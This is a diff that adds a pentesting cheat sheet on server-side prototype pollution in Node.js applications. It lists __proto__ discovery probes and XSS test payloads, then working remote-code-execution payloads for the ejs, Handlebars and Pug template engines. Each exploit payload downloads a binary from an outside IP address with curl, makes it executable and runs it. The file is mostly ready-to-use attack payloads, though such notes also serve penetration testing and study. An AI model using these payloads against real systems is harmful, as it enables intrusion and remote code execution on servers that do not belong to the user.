@@ -1,0 +1,99 @@
+### prototype pollution ###
+# https://book.hacktricks.xyz/pentesting-web/deserialization/nodejs-proto-prototype-pollution
+# https://github.com/KTH-LangSec/server-side-prototype-pollution?tab=readme-ov-file
+
+
+## Discovery
+# blackbox
+"__proto__": {
+  "toString": "foobar"
+}
+
+"__proto__": {
+  "hasOwnProperty": "foobar"
+}
+
+"__proto__": {
+  "__proto__": {
+    "toString": "foobar"
+  }
+}
+
+["__proto__"]: {
+  "toString": "foobar"
+}
+
+# ejs
+"__proto__": {
+  "escape": "foobar"
+}
+
+# Hbs
+"__proto__": {
+  "pendingContent": "<script>alert(1)</script>"
+}
+
+# Pug
+"__proto__": {
+  "block": {
+    "type": "Text",
+    "val":"<script>alert(1)</script>"
+  }
+}
+
+
+## Exploitation
+# ejs
+"__proto__": {
+  "outputFunctionName": "x = 1; console.log('haxhaxhax'); const { execSync } = process.mainModule.require('child_process');execSync('curl http://192.168.45.181/4444 -o /tmp/4444');execSync('chmod +x /tmp/4444');execSync('/tmp/4444'); ; y"
+}
+
+"__proto__": {
+  "escape": "function (x) { console.log('haxhaxhax'); const { execSync } = process.mainModule.require('child_process');execSync('curl http://192.168.45.181/4444 -o /tmp/4444');execSync('chmod +x /tmp/4444');execSync('/tmp/4444'); return x;}",
+  "client": "true"
+}
+
+# hbs
+"__proto__":{
+  "type": "Program",
+  "body":[
+    {
+      "type": "MustacheStatement",
+      "path":0,
+      "loc": 0,
+      "params":[
+        {
+          "type": "NumberLiteral",
+          "value": "process.mainModule.require('child_process').execSync('curl http://192.168.45.181/4444 -o /tmp/4444 && chmod +x /tmp/4444 && /tmp/4444')"
+        } 
+      ]
+    }
+  ]
+}
+
+# pug
+"__proto__": {
+	"block": {
+		"type": "Text",
+		"line":"process.mainModule.require('child_process').execSync('curl http://192.168.45.181/4444 -o /tmp/4444 && chmod +x /tmp/4444 && /tmp/4444')"
+	}
+}
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
